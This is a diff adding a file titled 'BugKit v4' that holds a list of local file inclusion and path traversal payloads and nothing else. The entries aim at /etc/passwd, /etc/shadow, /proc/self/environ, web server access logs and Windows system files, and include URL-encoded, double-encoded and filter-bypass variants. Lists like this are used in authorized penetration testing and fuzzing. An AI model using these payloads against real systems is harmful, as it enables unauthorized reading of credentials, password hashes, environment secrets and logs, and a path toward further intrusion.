@@ -1,0 +1,18 @@
+# BugKit v4 — LFI / Path Traversal Payload List
+lfi:../../../../etc/passwd
+lfi:../../../etc/passwd
+lfi:../../etc/passwd
+lfi:/etc/passwd
+lfi:../../../../etc/shadow
+lfi:../../../../etc/hosts
+lfi:../../../../proc/self/environ
+lfi:../../../../var/log/apache2/access.log
+lfi:../../../../var/log/nginx/access.log
+lfi:..%2F..%2F..%2Fetc%2Fpasswd
+lfi:%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+lfi:....//....//....//etc/passwd
+lfi:..%252F..%252F..%252Fetc%252Fpasswd
+lfi:../../../../Windows/System32/drivers/etc/hosts
+lfi:../../../../windows/win.ini
+lfi:C:\Windows\system.ini
+lfi:..\..\..\..\Windows\system.ini
